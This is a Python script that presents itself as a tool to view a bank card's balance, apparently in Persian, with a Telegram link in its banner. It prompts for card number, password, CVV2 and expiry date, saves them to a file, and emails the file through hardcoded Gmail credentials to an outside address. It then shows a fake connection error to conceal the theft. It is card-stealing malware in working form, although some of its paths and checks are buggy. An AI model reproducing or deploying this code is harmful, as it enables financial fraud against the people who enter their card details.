print("""

     ////////// //    //  //  // //        //////
     //        //     //  //       //    //      //
      //// //  //     //  //       //    //      //
           //  //     //  //       //    //      //
   ////////    // //  //  ////// //        //////

    +--------------------------------------------+
    +                  Sudo Hidde                +
    -    **moshahedeh mojodi cart banki**        -
    +     (https//telegram.me/sodohidden)        +
    +----------------------------------------------

""")



















import time
import os
import sys
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
time.sleep(6)
Number1 = (input("eNTER NUMber card = " ))
if len(Number1) == 16:
    print ("ok")
else:
    print ("enret cntrl+c next try agin")

password = (input("eNter password card = "))
  
cvv2 = (input("eNter cod cvv2 card ="))
if len(cvv2) == 4:
    print("ok")
else:
    print("enret cntrl+c next try agin")

import pathlib
pathlib.Path('/storage/emulated/0/mctp').mkdir(parents=True, exist_ok=True) 
file= open("/storage/emulated/0/mctp/informationhcard.txt","a")

Expiration =(input("eNter cod mm(_)yy Expiration card ="))
if len(Expiration) == 4:
    print("ok")
else:
    print("enret cntrl+c next try agin")    
time.sleep(5)
print("-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --please wait ")
print("View your information = ")
print("Number =" , Number1)
print("password" , password )
print("cvv2 =" , cvv2 )
print("Expiration =" , Expiration)
print("-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --your information ")
time.sleep(3)
Question = (input("Is your information correct? (y = yes) (n = no)"))
if(Question) == 'y':
    time.sleep(2)
    print("Connecting to server")
elif(Question) == 'n':
        quit()
print("-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --please wait ")
time.sleep(5)
print("loading . . . . . . ")

n = (Number1  + '/' +  password + '/' + cvv2 + '/'+ Expiration)

  
file.write(n)
file.close()
fromaddr = 'khodesudo@gmail.com'
toaddr = 'sudohidden@yahoo.com'
 
msg = MIMEMultipart()
 
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "sudohidden"
 
body = 'Python 3 send email test'
 
msg.attach(MIMEText(body, 'plain'))

#attach file 
filename = "combo_informationhcard.txt"
attachment = open('C:\mctp\informationhcard.txt', "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
msg.attach(part)
 
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr , "0926sudo")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
time.sleep(10)
print ("  Error !! Problem not connecting ....  ")
time.sleep(2)
man =(input("try agin Connecting to server? (yes = y) (no = n)"))
if man == ('y'):
            time.sleep(5)
            print ("!!Error!! (Connection to server was unsuccessful try agin next time) ")
elif man == ('n'):
            quit

